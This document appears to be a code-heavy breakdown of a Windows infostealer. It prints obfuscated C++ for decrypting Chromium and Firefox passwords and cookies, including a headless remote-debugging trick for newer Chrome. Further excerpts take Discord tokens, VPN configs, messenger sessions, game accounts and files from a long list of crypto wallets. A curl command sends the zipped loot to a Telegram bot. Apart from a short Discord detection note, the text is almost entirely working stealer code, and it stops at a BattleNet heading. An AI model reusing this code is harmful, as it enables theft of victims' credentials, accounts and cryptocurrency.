
## Stealer Functionality

```cpp
// Browser specific stealer functionality
SaveToFile(OBF("bookmarks.txt"), ConvertBookmarksToStrings(Browser::ExtractChromiumBookmarks()));
SaveToFile(OBF("passwords.txt"), ConvertPasswordsToStrings(Browser::GetPasswords()));
SaveToFile(OBF("history.txt"), ConvertHistoryToStrings(Browser::GetHistory()));
SaveToFile(OBF("autofill.txt"), ConvertAutofillToStrings(Browser::GetAutofill()));
SaveToFile(OBF("cookies.txt"), ConvertCookiesToStrings(Browser::GetCookies()));

// Misc applications
SaveToFile(OBF("discord.txt"), Discord::GetTokens());

Socials::Run();
Games::Extract();
VPN::Extract();
Wallets::Extract();
```

The "Command and Control" is through Telegram.

```cpp
std::string curlCommand = OBF("curl -F \"chat_id=") + std::string(CHAT_ID) + OBF("\" ")
    + OBF("-F \"document=@\\\"") + zipFileNameStr + OBF("\\\"\" ")
    + OBF("-F \"caption=") + message + OBF("\" ")
    + OBF("https://api.telegram.org/bot") + std::string(BOT_TOKEN) + OBF("/sendDocument");
```

Some additional stealer functionality through ASAR repacking (for Mullvad/Exodus/etc.) - content has been removed and replaced with:

```cpp
std::string newContent = FetchUrl(
    OBF(L"raw.githubusercontent.com"),
    OBF(L"get paid version at : t.me/NyxEnigma"),
    true
);
```

Leveraging Vectored Exception Handlers for static analysis misdirection:
`https://github.com/rad9800/VehApiResolve`

## Browsers

General Flow:

1. From the browser profiles, get the locations required
  a. Profile Location
  b. Browser Root
2. Copy the database files to a temp location
3. If any encryption is used, get the master key
3. Map the files into memory
4. Parse the files for the required information, if any encryption is used, decrypt the data

### Browser Profile Locations

To retrieve the Chromium paths and profile information required for the stealer:

```
// 1. When doing a snapshot of processes - to find the corect Chrom browser - check for existence of 
const WCHAR* flags = TEXT("--utility-sub-type=network.mojom.NetworkService");

static std::vector<Models::Chromium> ChromiumPaths() {
    auto roots = GetSpecialFolders();
    std::vector<Models::Chromium> results;
    std::mutex mutex;

    std::vector<std::thread> workers;
    for (const auto& root : roots) {
        workers.emplace_back([&, root] {
            auto browsers = ListBrowsers(root, [](const fs::path& p) {
                return IsChromiumBrowser(p);
                });

            for (const auto& browser : browsers) {
                auto browserRoot = fs::exists(browser / OBF("User Data"))
                    ? browser / OBF("User Data") : browser;

                auto version = SafeRead(browserRoot / OBF("Last Version"), OBF(L"1.0.0.0"));
                auto exePath = SafeRead(browserRoot / OBF("Last Browser"), OBF(L""));
                exePath.erase(std::remove(exePath.begin(), exePath.end(), OBF(L'\0')), exePath.end());

                if (exePath.empty()) {
                    exePath = GetDefaultPath(browserRoot);
                }

                auto profiles = ListProfiles(browserRoot);

                for (const auto& profile : profiles) {
                    Models::Chromium info{
                        browser.filename().wstring(),
                        version,
                        browserRoot.wstring(),
                        exePath,
                        profile.filename().wstring(),
                        profile.wstring()
                    };
                    std::lock_guard lock(mutex);
                    results.push_back(info);
                }
            }
            });
    }

    for (auto& worker : workers) {
        if (worker.joinable()) worker.join();
    }

    return results;
}
```

### Boomarks

```cpp
struct Bookmark {
    std::string url;
    std::string name;
    std::string date_added;
};
```

```cpp
// For Gecko browsers (Firefox): 
fs::path bookmark = fs::path(Gecko.profileLocation) / OBF("places.sqlite");
const char* bookmarkPath = (TEMP + OBF("\\") + RandomString(7) + OBF(".db")).c_str();
const char* query = OBF("SELECT id, url, dateAdded, title FROM (SELECT * FROM moz_bookmarks INNER JOIN moz_places ON moz_bookmarks.fk=moz_places.id)");
```

```cpp
// For Chromium browsers:
static std::vector<Models::Chromium> ChromiumPaths() {
fs::path bookmark = fs::path(Chromium.profileLocation) / OBF("Bookmarks");
Copy bookmark to temp location, map into memory, parse JSON, extract bookmarks, and return them as a vector of Bookmark objects.

auto parseBookmarks = [&](const nlohmann::json& node, auto& parseRef) -> void {
    if (!node.is_object() || !node.contains("children")) return;

    for (const auto& child : node["children"]) {
        if (child.contains("name") && child.contains("url")) {
            bookmarks.push_back({
                child["url"].get<std::string>(),
                child["name"].get<std::string>(),
                child.value("date_added", OBF("0"))
                });
        }
        parseRef(child, parseRef);
    }
    };

if (bookmarksJson.contains("roots")) {
    for (const auto& item : bookmarksJson["roots"].items()) {
        parseBookmarks(item.value(), parseBookmarks);
    }
}
```

### Passwords

```cpp
struct Password {
    std::string site;
    std::string username;
    std::string password;
    std::string browsername;
};
```

```cpp
// Password databases for Chromium-based browsers
fs::path pws = fs::path(Chromium.profileLocation) / OBF("Login Data");
fs::path LocalState = fs::path(Chromium.browserRoot) / OBF("Local State");


// Temp folders to copy the database files to
std::string passwords_str = TEMP + OBF("\\") + RandomString(7) + OBF(".db");
const char* passwords = passwords_str.c_str();
std::string local_state_str = TEMP + OBF("\\") + RandomString(7) + OBF(".db");
const char* local_state = local_state_str.c_str();

// Get the master key for the state file (encrypted/decrypted with DPAPI)
std::string master_key = Crypto::GetMasterKey(local_state);

std::string query = OBF("SELECT origin_url, username_value, password_value FROM logins");
if (sqlite3_prepare_v2(db, query.c_str(), -1, &stmt, nullptr) != SQLITE_OK) {
    sqlite3_close(db);
    HiddenCalls::UnmapViewOfFile(mappedFile);
    HiddenCalls::CloseHandle(hMap);
    HiddenCalls::CloseHandle(hFile);
    continue;
}

while (sqlite3_step(stmt) == SQLITE_ROW) {
    Password password;
    password.site = std::string(reinterpret_cast<const char*>(sqlite3_column_text(stmt, 0)));
    if (password.site.empty()) continue;

    password.username = std::string(reinterpret_cast<const char*>(sqlite3_column_text(stmt, 1)));
    if (password.username.empty()) continue;

    const int size = sqlite3_column_bytes(stmt, 2);
    if (size <= 0) continue;

    const auto* encrypted_password = static_cast<const unsigned char*>(sqlite3_column_blob(stmt, 2));
    if (encrypted_password == nullptr) continue;

    std::vector<unsigned char> encrypted_password_vec(encrypted_password, encrypted_password + size);
    password.password = Crypto::AES256GCMDecrypt(master_key, encrypted_password_vec);

    if (!password.username.empty() && !password.password.empty()) {
        password.browsername = wstring_to_string(Chromium.profileLocation);
        pswds.push_back(password);
    }
}
 ```

```cpp
// Password storage for Gecko based browsers
fs::path pws = fs::path(Gecko.profileLocation) / OBF("logins.json");
for (auto& password : j[OBF("logins")]) {
  Password pswd;
  pswd.site = password[OBF("hostname")].get<std::string>();
  pswd.username = NSS::PK11SDR_Decrypt(profile, password[OBF("encryptedUsername")].get<std::string>());
  pswd.password = NSS::PK11SDR_Decrypt(profile, password[OBF("encryptedPassword")].get<std::string>());

  if (pswd.username.empty() || pswd.password.empty()) continue;
  pswd.browsername = wstring_to_string(Gecko.profileLocation);
  pswds.push_back(pswd);
}
```

### History

```cpp
struct History {
    std::string url;
    std::string title;
    int visit_count;
    std::string last_visit_time;
};
```

```cpp
// For Chromium browsers
fs::path HHistory = fs::path(Chromium.profileLocation) / OBF("History");
std::string tempdb = TEMP + OBF("\\") + RandomString(7) + OBF(".db");
copy_file(HHistory, tempdb, fs::copy_options::overwrite_existing);

std::string query = OBF("SELECT url, title, visit_count, last_visit_time FROM urls");
if (sqlite3_prepare_v2(db, query.c_str(), -1, &stmt, nullptr) != SQLITE_OK) {
    sqlite3_close(db);
    HiddenCalls::CloseHandle(hFile);
    continue;
}

while (sqlite3_step(stmt) == SQLITE_ROW) {
    History historyEntry;
    historyEntry.url = std::string(reinterpret_cast<const char*>(sqlite3_column_text(stmt, 0)));
    historyEntry.title = std::string(reinterpret_cast<const char*>(sqlite3_column_text(stmt, 1)));
    historyEntry.visit_count = sqlite3_column_int(stmt, 2);
    historyEntry.last_visit_time = std::to_string(sqlite3_column_int64(stmt, 3));

    h.push_back(historyEntry);
}
```

```cpp
// For Gecko browsers
fs::path HHistory = fs::path(Gecko.profileLocation) / OBF("places.sqlite");
std::string query = OBF("SELECT title, url, visit_count, last_visit_date FROM moz_places WHERE title IS NOT NULL");
```

### Autofill

```cpp
struct Autofill {
    std::string input;
    std::string value;
};
```

```cpp
// For Chromium
fs::path autofill = fs::path(Chromium.profileLocation) / OBF("Web Data");
std::string query = OBF("SELECT name, value FROM autofill");
```

```cpp
// For Gecko
fs::path autofill = fs::path(Gecko.profileLocation) / OBF("formhistory.sqlite");
std::string query = OBF("SELECT fieldname, value FROM moz_formhistory");
```

### Cookies

```cpp
struct Cookie {
    std::string site;
    std::string name;
    std::string value;
    std::string path;
    std::string expires;
    bool is_secure;
};
```

```cpp
// For Chromium
// 1. Get the browser version
std::wstringstream ss(Chromium.browserVersion);
std::wstring firstPart;
std::getline(ss, firstPart, OBF(L'.'));
int versionNumber = std::stoi(firstPart);

// For older versions, use the existing method
fs::path CCookie = fs::path(Chromium.profileLocation) / OBF("Network") / OBF("Cookies"); // CCookie to not conflict with the other Cookie var
fs::path LocalState = fs::path(Chromium.browserRoot) / OBF("Local State");

std::string master_key = Crypto::GetMasterKey(local_state);
std::string query = OBF("SELECT name, host_key, path, expires_utc, is_secure, encrypted_value FROM cookies");

```

```cpp
// For Chromium browsers if the version number is 127 or higher (handle the new encryption method)
// https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e
// https://github.com/slyd0g/WhiteChocolateMacademiaNut

BrowserCookieExtractor obj;
obj.GetCookie(Chromium.browserPath, Chromium.browserRoot, Chromium.browserName);
 
// 1. Get the path to the browser executable and terminate any existing processes
std::wstring filename = std::filesystem::path(browserPath).filename().wstring();
TerminateBrowserProcesses(filename);

// 2. Generate a random port number between 10000 and 65535 and check if it's available
std::random_device rd;
std::mt19937 gen(rd());
std::uniform_int_distribution<> dist(10000, 65535);

do { port = dist(gen); } while (IsPortAvailable(port));

// 3. Create the command line for launching the browser in headless mode with remote debugging enabled
// To send commands, sent over websocket to the debug port
std::wstring cmdLine = OBF(L"\"") + browserPath + OBF(L"\" --headless ") +
  OBF(L"--user-data-dir=\"") + userData + OBF(L"\" ") +
  OBF(L"--remote-debugging-port=") + std::to_wstring(port) + OBF(L" ") +
  OBF(L"--remote-allow-origins=* ") +
  OBF(L"--disable-extensions --no-sandbox --disable-gpu");

// 4. Send the command line to the browser process to retrieve information required to connect to the 
// websocket URL
HINTERNET hSession = WinHttpOpen(L"CookieFetcher", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
HINTERNET hConnect = WinHttpConnect(hSession, L"localhost", port, 0);
HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", L"/json", NULL, NULL, NULL, 0);

// Read the response from the HTTP request
string response;
DWORD size = 0;
while (WinHttpQueryDataAvailable(hRequest, &size) && size > 0) {
    vector<char> buffer(size);
    DWORD downloaded;
    if (!WinHttpReadData(hRequest, buffer.data(), size, &downloaded)) break;
    response.append(buffer.data(), downloaded);
}

// 5. Extract the webSocketDebuggerUrl from the /json response with regex
regex pattern("\"webSocketDebuggerUrl\":\\s*\"(ws://[^\"]+)\"");
smatch match;
string wsUrl;
if (!regex_search(response, match, pattern)) return "";
wsUrl = match[1];

// 6. Connect to the websocket URL for remote debugging (has a websocket client implementation over a raw TCP socket)
size_t pos = wsUrl.find("ws://");
if (pos != string::npos) wsUrl = wsUrl.substr(pos + 5);

string host = "127.0.0.1";
int wsPort = stoi(wsUrl.substr(wsUrl.find(':') + 1, wsUrl.find('/') - wsUrl.find(':') - 1));
string path = wsUrl.substr(wsUrl.find('/'));

WebSocketClient ws(host, wsPort);
if (!ws.Connect() || !ws.Handshake(path)) return "";

// 7. Send the command to retrieve all cookies
ws.Send(R"({"id":1,"method":"Network.getAllCookies"})");
string wsResponse = ws.Receive();

// 8. Parse the response to extract cookie data
json cookieData;
try { cookieData = json::parse(wsResponse); }

if (!cookieData.contains("result") || !cookieData["result"].contains("cookies"))
  return "";

string output;
for (auto& cookie : cookieData["result"]["cookies"]) {
  output += cookie["domain"].get<string>() + "\t" +
      (cookie["domain"].get<string>().front() == '.' ? "TRUE" : "FALSE") + "\t" +
      cookie["path"].get<string>() + "\t" +
      (cookie["secure"].get<bool>() ? "TRUE" : "FALSE") + "\t" +
      to_string(cookie["expires"].get<long long>()) + "\t" +
      cookie["name"].get<string>() + "\t" +
      cookie["value"].get<string>() + "\n";
  }
}

// 9. Save the cookies to a file
if (!cookies.empty()) {
  std::wstring filePath = tempPath + OBF(L"\\sryxen\\cookies_dump_") + name + OBF(L".txt");
}
```

```cpp
// For Gecko browsers (and handles .ROBLOSECURITY cookies - for Roblox)
  std::string query = OBF("SELECT name, host, path, expiry, isSecure, value FROM moz_cookies");
  if (cookie.name == OBF(".ROBLOSECURITY")) {
      robloxCookies.push_back(cookie.value);
  }

```

## Misc

### Discord

1. Finds path to Discord on disk (local storage)
2. Levels DB state folder, finds master key (encrypted with DPAPI)
3. Searches local storage for tokens begininng with `dQw4w9WgXcQ`

Detection:

* Not Discord.exe proceess accessing Discord's local storage
  * Mini-filter/kernel level
  * ETW (this is probably the better approach here)
* dQw4w9WgXcQ

```cpp
const std::regex token_regex(OBF(R"(dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^"]*)"));
const std::regex normal_regex(OBF(R"(([\d\w_-]{24,26}\.[\d\w_-]{6}\.[\d\w_-]{25,110}))"));

std::string chunk = OS::ReadFile(local_storage);
if (chunk.empty()) continue;

std::smatch match, match2;
std::regex_search(chunk, match, token_regex);
std::regex_search(chunk, match2, normal_regex);

if (match[0].str().empty() && match2[1].str().empty()) continue;

std::string encrypted_token = match[0].str().empty() ? match2[1].str() : match[0].str();
std::string token;

if (starts_with(encrypted_token, OBF("dQw4w9WgXcQ"))) {
    encrypted_token = base64_decode(encrypted_token.substr(12));
    token = Crypto::AES256GCMDecrypt(master_key, { encrypted_token.begin(), encrypted_token.end() });
}
```

### VPN

```cpp
ProtonVPN::Extract(vpnDir);
Surfshark::Extract(vpnDir);
OpenVPN::Extract(vpnDir);
```

#### ProtonVPN

```cpp
// 1. Get location of ProtonVPN folder
std::string protonvpnFolder = std::string(getenv(OBF("LOCALAPPDATA"))) + "\\" + OBF("ProtonVPN");
// 2. Iterate through the ProtonVPN folder and find folders that contain with "ProtonVPN_Url_"
for (const auto& entry : fs::directory_iterator(protonvpnFolder)) {
  std::string folderName = entry.path().filename().string();
  if (folderName.rfind(OBF("ProtonVPN_Url_"), 0) == 0) {
// 3. Rescursively copy the matching directories to the temp folder
for (const auto& file : fs::recursive_directory_iterator(entry.path())) {
    std::string fileDest = destPath + "\\" + file.path().filename().string();
    HiddenCalls::CopyFileA(file.path().string().c_str(), fileDest.c_str(), FALSE);
}
```

#### Surfshark

```cpp
// 1. Get location of Surfshark folder
std::string surfsharkFolder = std::string(getenv(OBF("APPDATA"))) + "\\" + OBF("Surfshark");

// 2. Files to copy from the Surfshark folder
std::vector<std::string> files = {
    OBF("data.dat"), OBF("settings.dat"), OBF("settings-log.dat"), OBF("private_settings.dat")
};

// 3. Copy to the temp folder
for (const auto& file : files) {
    std::string srcPath = surfsharkFolder + "\\" + file;
    std::string dstPath = surfsharkAccount + "\\" + file;
    if (fs::exists(srcPath)) {
        HiddenCalls::CopyFileA(srcPath.c_str(), dstPath.c_str(), FALSE);
        copied++;
    }
}
```

#### OpenVPN

```cpp
// 1. Get location of OpenVPN folder
std::string openvpnFolder = std::string(getenv(OBF("USERPROFILE"))) + "\\" + OBF("AppData\\Roaming\\OpenVPN Connect");

// 2. Get the profiles folder in the OpenVPN folder and copy all files within this folder to the temp folder
std::string profilesPath = openvpnFolder + "\\" + OBF("profiles");
if (fs::exists(profilesPath)) {
    for (const auto& file : fs::recursive_directory_iterator(profilesPath)) {
        std::string fileDest = openvpnAccount + "\\" + file.path().filename().string();
        HiddenCalls::CopyFileA(file.path().string().c_str(), fileDest.c_str(), FALSE);
    }
}

// 3. Copy the config.json file from the OpenVPN folder to the temp folder
std::string configPath = openvpnFolder + "\\" + OBF("config.json");
if (fs::exists(configPath)) {
    HiddenCalls::CopyFileA(configPath.c_str(), (openvpnAccount + "\\" + OBF("config.json")).c_str(), FALSE);
}
```

### Wallet

```cpp
// 1. Define all wallet locations (and browser extensions) to dump data from
const char* appData = std::getenv("APPDATA");
const char* localAppData = std::getenv("LOCALAPPDATA");
```

#### Browser Wallets

```cpp
// 1. Get all the Chromium based browsers
static auto chromiumBrowsers = Paths::ChromiumPaths(); 

// 2. For all browsers, get the extension settings folder
for (const auto& browser : chromiumbrowsers) {
  fs::path browserBasePath = browser.browserRoot;
  fs::path extDir = browserBasePath / OBF("Local Extension Settings");
}

// 3. Iterate over the wallet extensions (crypto browser extensions) to copy the data from
// Checks if the location for the extension setting exists, and if so - copy into the temp folder
for (const auto& walletExt : walletExtensions) {
    // a. Construct the extension settings path
    const std::string& extID = walletExt.first;
    const std::string& name = walletExt.second;
    fs::path walletPath = extDir / extID;

    // b. Check if it exists
    if (fs::exists(walletPath)) {
        std::string destPath = walletExtDir + "\\" + name;
        HiddenCalls::CreateDirectoryA(destPath.c_str(), NULL);

        // c. If it exists, copy the extension settings to the temp folder
        for (const auto& file : fs::directory_iterator(walletPath)) {
            std::string fileDest = destPath + "\\" + file.path().filename().string();
            HiddenCalls::CopyFileA(file.path().string().c_str(), fileDest.c_str(), FALSE);
        }
    }
}
```

```cpp
std::map<std::string, std::string> walletExtensions = {
    {OBF("dlcobpjiigpikoobohmabehhmhfoodbb"), OBF("Argent X")},
    {OBF("jiidiaalihmmhddjgbnbgdfflelocpak"), OBF("BitKeep Wallet")},
    {OBF("bopcbmipnjdcdfflfgjdgdjejmgpoaab"), OBF("BlockWallet")},
    {OBF("odbfpeeihdkbihmopkbjmoonfanlbfcl"), OBF("Coinbase")},
    {OBF("hifafgmccdpekplomjjkcfgodnhcellj"), OBF("Crypto.com")},
    {OBF("kkpllkodjeloidieedojogacfhpaihoh"), OBF("Enkrypt")},
    {OBF("mcbigmjiafegjnnogedioegffbooigli"), OBF("Ethos Sui")},
    {OBF("aholpfdialjgjfhomihkjbmgjidlcdno"), OBF("ExodusWeb3")},
    {OBF("hpglfhgfnhbgpjdenjgmdgoeiappafln"), OBF("Guarda")},
    {OBF("afbcbjpbpfadlkmhmclhkeeodmamcflc"), OBF("MathWallet")},
    {OBF("mcohilncbfahbmgdjkbpemcciiolgcge"), OBF("OKX")},
    {OBF("jnmbobjmhlngoefaiojfljckilhhlhcj"), OBF("OneKey")},
    {OBF("fnjhmkhhmkbjkkabndcnnogagogbneec"), OBF("Ronin")},
    {OBF("lgmpcpglpngdoalbgeoldeajfclnhafa"), OBF("SafePal")},
    {OBF("mfgccjchihfkkindfppnaooecgfneiii"), OBF("TokenPocket")},
    {OBF("nphplpgoakhhjchkkhmiggakijnkhfnd"), OBF("Ton")},
    {OBF("amkmjjmmflddogmhpjloimipbofnfjih"), OBF("Wombat")},
    {OBF("heamnjbnflcikcggoiplibfommfbkjpj"), OBF("Zeal")},
    {OBF("jagohholfbnaombfgmademhogekljklp"), OBF("Binance Smart Chain")},
    {OBF("bhghoamapcdpbohphigoooaddinpkbai"), OBF("Authenticator")},
    {OBF("fhbohimaelbohpjbbldcngcnapndodjp"), OBF("Binance")},
    {OBF("fihkakfobkmkjojpchpfgcmhfjnmnfpi"), OBF("Bitapp")},
    {OBF("aodkkagnadcbobfpggfnjeongemjbjca"), OBF("BoltX")},
    {OBF("aeachknmefphepccionboohckonoeemg"), OBF("Coin98")},
    {OBF("hnfanknocfeofbddgcijnmhnfnkdnaad"), OBF("Coinbase")},
    {OBF("agoakfejjabomempkjlepdflaleeobhb"), OBF("Core")},
    {OBF("pnlfjmlcjdjgkddecgincndfgegkecke"), OBF("Crocobit")},
    {OBF("blnieiiffboillknjnepogjhkgnoapac"), OBF("Equal")},
    {OBF("cgeeodpfagjceefieflmdfphplkenlfk"), OBF("Ever")},
    {OBF("ebfidpplhabeedpnhjnobghokpiioolj"), OBF("Fewcha")},
    {OBF("cjmkndjhnagcfbpiemnkdpomccnjblmj"), OBF("Finnie")},
    {OBF("nanjmdknhkinifnkgdcggcfnhdaammmj"), OBF("Guild")},
    {OBF("fnnegphlobjdpkhecapkijjdkgcjhkib"), OBF("HarmonyOutdated")},
    {OBF("flpiciilemghbmfalicajoolhkkenfel"), OBF("Iconex")},
    {OBF("cjelfplplebdjjenllpjcblmjkfcffne"), OBF("Jaxx Liberty")},
    {OBF("jblndlipeogpafnldhgmapagcccfchpi"), OBF("Kaikas")},
    {OBF("pdadjkfkgcafgbceimcpbkalnfnepbnk"), OBF("KardiaChain")},
    {OBF("dmkamcknogkgcdfhhbddcghachkejeap"), OBF("Keplr")},
    {OBF("kpfopkelmapcoipemfendmdcghnegimn"), OBF("Liquality")},
    {OBF("nlbmnnijcnlegkjjpcfjclmcfggfefdm"), OBF("MEWCX")},
    {OBF("dngmlblcodfobpdpecaadgfbcggfjfnm"), OBF("MaiarDEFI")},
    {OBF("efbglgofoippbgcjepnhiblaibcnclgk"), OBF("Martian")},
    {OBF("nkbihfbeogaeaoehlefnkodbefgpgknn"), OBF("Metamask")},
    {OBF("ejbalbakoplchlghecdalmeeeajnimhm"), OBF("Metamask2")},
    {OBF("fcckkdbjnoikooededlapcalpionmalo"), OBF("Mobox")},
    {OBF("lpfcbjknijpeeillifnkikgncikgfhdo"), OBF("Nami")},
    {OBF("jbdaocneiiinmjbjlgalhcelgbejmnid"), OBF("Nifty")},
    {OBF("fhilaheimglignddkjgofkcbgekhenbh"), OBF("Oxygen")},
    {OBF("mgffkfbidihjpoaomajlbgchddlicgpn"), OBF("PaliWallet")},
    {OBF("ejjladinnckdgjemekebdpeokbikhfci"), OBF("Petra")},
    {OBF("bfnaelmomeimhlpmgjnjophhpkkoljpa"), OBF("Phantom")},
    {OBF("phkbamefinggmakgklpkljjmgibohnba"), OBF("Pontem")},
    {OBF("nkddgncdjgjfcddamfgcmfnlhccnimig"), OBF("Saturn")},
    {OBF("pocmplpaccanhmnllbbkpgfliimjljgo"), OBF("Slope")},
    {OBF("bhhhlbepdkbapadjdnnojkbgioiodbic"), OBF("Solfare")},
    {OBF("fhmfendgdocmcbmfikdcogofphimnkno"), OBF("Sollet")},
    {OBF("mfhbebgoclkghebffdldpobeajmbecfk"), OBF("Starcoin")},
    {OBF("cmndjbecilbocjfkibfbifhngkdmjgog"), OBF("Swash")},
    {OBF("ookjlbkiijinhpmnjffcofjonbfbgaoc"), OBF("TempleTezos")},
    {OBF("aiifbnbfobpmeekipheeijimdpnlpgpp"), OBF("TerraStation")},
    {OBF("ibnejdfjmmkpcnlpebklmnkoeoihofec"), OBF("Tron")},
    {OBF("egjidjbpglichdcondbcbdnbeeppgdph"), OBF("Trust Wallet")},
    {OBF("hmeobnfnfcmdkdcmlblgagmfpfboieaf"), OBF("XDEFI")},
    {OBF("eigblbgjknlfbajkfhopmcojidlgcehm"), OBF("XMR.PT")},
    {OBF("bocpokimicclpaiekenaeelehdjllofo"), OBF("XinPay")},
    {OBF("ffnbelfdoeiohenkjibnmadjiehjhajb"), OBF("Yoroi")},
    {OBF("kncchdigobghenbbaddojjnnaogfppfj"), OBF("iWallet")},
    {OBF("epapihdplajcdnnkdeiahlgigofloibg"), OBF("Sender")}
};
```

#### Desktop Wallets

```cpp
const std::map<std::string, std::string> walletPaths = {
    {OBF("Armory"), std::string(appData) + "\\" + OBF("Armory")},
    {OBF("Atomic"), std::string(appData) + "\\" + OBF("Atomic\\Local Storage\\leveldb")},
    {OBF("Bitcoin"), std::string(appData) + "\\" + OBF("Bitcoin\\wallets")},
    {OBF("Bytecoin"), std::string(appData) + "\\" + OBF("bytecoin")},
    {OBF("Coinomi"), std::string(localAppData) + "\\" + OBF("Coinomi\\Coinomi\\wallets")},
    {OBF("Dash"), std::string(appData) + "\\" + OBF("DashCore\\wallets")},
    {OBF("Electrum"), std::string(appData) + "\\" + OBF("Electrum\\wallets")},
    {OBF("Ethereum"), std::string(appData) + "\\" + OBF("Ethereum\\keystore")},
    {OBF("Exodus"), std::string(appData) + "\\" + OBF("Exodus\\exodus.wallet")},
    {OBF("Guarda"), std::string(appData) + "\\" + OBF("Guarda\\Local Storage\\leveldb")},
    {OBF("Jaxx"), std::string(appData) + "\\" + OBF("com.liberty.jaxx\\IndexedDB\\file__0.indexeddb.leveldb")},
    {OBF("Litecoin"), std::string(appData) + "\\" + OBF("Litecoin\\wallets")},
    {OBF("MyMonero"), std::string(appData) + "\\" + OBF("MyMonero")},
    {OBF("Monero"), std::string(appData) + "\\" + OBF("Monero")},
    {OBF("Zcash"), std::string(appData) + "\\" + OBF("Zcash")}
};
```

```cpp
for (const auto& wallet : walletPaths) {
    const std::string& name = wallet.first;
// a. Construct the path to the desktop wallet
    const std::string& path = wallet.second;

    // b. Check if it exists
    if (fs::exists(path)) {
        std::string destPath = walletDir + "\\" + name;
        HiddenCalls::CreateDirectoryA(destPath.c_str(), NULL);

        // c. If it exists, copy the wallet data to the temp folder
        for (const auto& file : fs::directory_iterator(path)) {
            std::string fileDest = destPath + "\\" + file.path().filename().string();
            HiddenCalls::CopyFileA(file.path().string().c_str(), fileDest.c_str(), FALSE);
        }
    }
}
```

### Socials

```cpp
Element::Extract(baseDir);
ICQ::Extract(baseDir);
Viber::Extract(baseDir);
//Signal::Extract(baseDir);
Telegram::Extract(baseDir);
QTox::Extract(baseDir);
Pidgin::Extract(baseDir);
Skype::Extract(baseDir);
```

Most of these recursively copy all folders, unless explictily noted.

```cpp
// Element
_dupenv_s(&roamingPath, &requiredSize, OBF("APPDATA"));
std::string elementDir = std::string(roamingPath) + OBF("\\Element");

// ICQ
_dupenv_s(&roamingPath, &requiredSize, OBF("APPDATA"));
std::string icqDir = std::string(roamingPath) + OBF("\\ICQ");

// Viper
_dupenv_s(&userProfilePath, &requiredSize, OBF("USERPROFILE"));
std::string viberDir = std::string(userProfilePath) + OBF("\\AppData\\Roaming\\ViberPC");

// Telegram (excludes several files when copying)
_dupenv_s(&userProfilePath, &requiredSize, OBF("USERPROFILE"));
std::string pathTele = std::string(userProfilePath) + OBF("\\AppData\\Roaming\\Telegram Desktop\\tdata");
CopyDirExclude(pathTele, telegramSession, { 
  OBF("user_data"), OBF("emoji"), 
  OBF("tdummy"), OBF("user_data#2"), 
  OBF("user_data#3"), OBF("webview"), 
  OBF("user_data#4"), OBF("user_data#5"), 
  OBF("user_data#6") 
});

// QTox
_dupenv_s(&appdataPath, &requiredSize, OBF("APPDATA"));
std::string toxDir = std::string(appdataPath) + OBF("\\Tox");

// Pidgin (only copies certain files)
_dupenv_s(&roamingPath, &requiredSize, OBF("USERPROFILE"));
std::string pidginDir = std::string(roamingPath) + OBF("\\AppData\\Roaming\\.purple");
std::string accountsFile = pidginDir + OBF("\\accounts.xml");
std::string destPath = targetDir + OBF("\\accounts.xml");

// Skype
_dupenv_s(&appdataPath, &requiredSize, OBF("APPDATA"));
std::string skypeDir = std::string(appdataPath) + OBF("\\Microsoft\\Skype for Desktop");
```

### Games

```cpp
Minecraft::Extract(gamesDir);
EpicGames::Extract(gamesDir);
Ubisoft::Extract(gamesDir);
ElectronicArts::Extract(gamesDir);
Growtopia::Extract(gamesDir);
BattleNet::Extract(gamesDir);
//Steam::ExtractSteamSession(gamesDir);
```

```cpp
// Minecraft
_dupenv_s(&userProfile, &len, OBF("USERPROFILE"));
std::map<std::string, std::string> minecraftPaths = {
    {OBF("Intent"), userProfilePath + "\\" + OBF("intentlauncher\\launcherconfig")},
    {OBF("Lunar"), userProfilePath + "\\" + OBF(".lunarclient\\settings\\game\\accounts.json")},
    {OBF("TLauncher"), userProfilePath + "\\" + OBF("AppData\\Roaming\\.minecraft\\TlauncherProfiles.json")},
    {OBF("Feather"), userProfilePath + "\\" + OBF("AppData\\Roaming\\.feather\\accounts.json")},
    {OBF("Meteor"), userProfilePath + "\\" + OBF("AppData\\Roaming\\.minecraft\\meteor-client\\accounts.nbt")},
    {OBF("Impact"), userProfilePath + "\\" + OBF("AppData\\Roaming\\.minecraft\\Impact\\alts.json")},
    {OBF("Badlion"), userProfilePath + "\\" + OBF("AppData\\Roaming\\Badlion Client\\accounts.json")}
};

std::string targetDir = baseDir + "\\" + OBF("Minecraft");
HiddenCalls::CreateDirectoryA(targetDir.c_str(), NULL);

for (const auto& entry : minecraftPaths) {
    std::string path = entry.second;
    if (fs::exists(path)) {
        std::string destination = targetDir + "\\" + fs::path(path).filename().string();
        HiddenCalls::CopyFileA(path.c_str(), destination.c_str(), FALSE);
    }
}

// Epic Games
std::string epicGamesFolder = std::string(getenv(OBF("LOCALAPPDATA"))) + "\\" + OBF("EpicGamesLauncher");
HiddenCalls::CopyDirectory((epicGamesFolder + "\\" + OBF("Saved\\Config")).c_str(), (targetDir + "\\" + OBF("Config")).c_str());
HiddenCalls::CopyDirectory((epicGamesFolder + "\\" + OBF("Saved\\Logs")).c_str(), (targetDir + "\\" + OBF("Logs")).c_str());
HiddenCalls::CopyDirectory((epicGamesFolder + "\\" + OBF("Saved\\Data")).c_str(), (targetDir + "\\" + OBF("Data")).c_str());

// Ubisoft
std::string ubisoftFolder = std::string(getenv(OBF("LOCALAPPDATA"))) + "\\" + OBF("Ubisoft Game Launcher");
if (!fs::exists(ubisoftFolder)) return;
std::string targetDir = baseDir + "\\" + OBF("Ubisoft");
HiddenCalls::CreateDirectoryA(targetDir.c_str(), NULL);
HiddenCalls::CopyDirectory(ubisoftFolder.c_str(), targetDir.c_str());

// Electronic Arts
std::string eaFolder = std::string(getenv(OBF("LOCALAPPDATA"))) + "\\" + OBF("Electronic Arts\\EA Desktop\\CEF");
std::string targetDir = baseDir + "\\" + OBF("ElectronicArts");
HiddenCalls::CreateDirectoryA(targetDir.c_str(), NULL);
HiddenCalls::CopyDirectory(eaFolder.c_str(), targetDir.c_str());

// Growtopia
std::string growtopiaFolder = std::string(getenv(OBF("LOCALAPPDATA"))) + "\\" + OBF("Growtopia");
std::string saveFile = growtopiaFolder + "\\" + OBF("save.dat");

// BattleNet
